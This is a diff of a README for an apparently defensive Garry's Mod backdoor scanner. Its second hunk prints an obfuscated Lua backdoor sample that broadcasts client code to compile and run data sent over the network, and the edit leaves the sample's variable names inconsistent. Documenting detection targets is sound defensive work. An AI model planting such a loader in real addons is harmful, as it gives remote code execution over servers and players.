@@ -32,7 +32,7 @@ Clone or download the files inside your **addons folder**.
 ## Commands
 
     #
-    |-> bs_tests                Run a series of tests when BS.DEVMODE is
+    |-> bs_tests                Run a series of tests when BS.devMode is
     |                           set to true.
     |
     |-> bs_scan FOLDER(S)       Recursively scan all files in FOLDER(S).
@@ -511,7 +511,7 @@ util.AddNetworkString("cKdwwjkBzpUSproGWmGe")
 _R["BroadcastLua"]([[net.Receive("cKdwwjkBzpUSproGWmGe",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
 function _0x427940(HsQzhjEtDdhsZssJfpfL)
   timer.Simple( 0.5, function( )
-   _R["data"] = util.Compress(HsQzhjEtDdhsZssJfpfL)
+   _R["DATA"] = util.Compress(HsQzhjEtDdhsZssJfpfL)
    _R["len"] = #data
    _R["\110\101\116"]["\83\116".."\97\114\116"]("cKdwwjkBzpUSproGWmGe")
    _R["\110".."\101\116"]["\87\114".."\105\116\101\85\73\110\116"](len, 16)
